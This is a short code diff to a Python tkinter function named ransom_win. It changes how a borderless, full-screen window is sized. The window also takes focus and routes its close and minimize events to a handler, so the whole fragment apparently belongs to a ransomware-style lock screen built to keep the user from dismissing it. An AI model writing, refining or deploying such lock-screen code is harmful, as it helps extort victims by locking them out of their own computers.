@@ -20,7 +20,9 @@ def ransom_win():
     wa = tk.Tk()
     wa.title('Defensive Blocks')
     wa.overrideredirect(True)
-    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
+    x = wa.winfo_screenwidth()
+    y = wa.winfo_screenheight()
+    wa.geometry("%dx%d" % (x, y))
     wa.focus_set()  # <-- move focus to this widget
     wa.protocol("WM_DELETE_WINDOW", exb)
     wa.protocol("WM_MINIMIZE_WINDOW", exb)
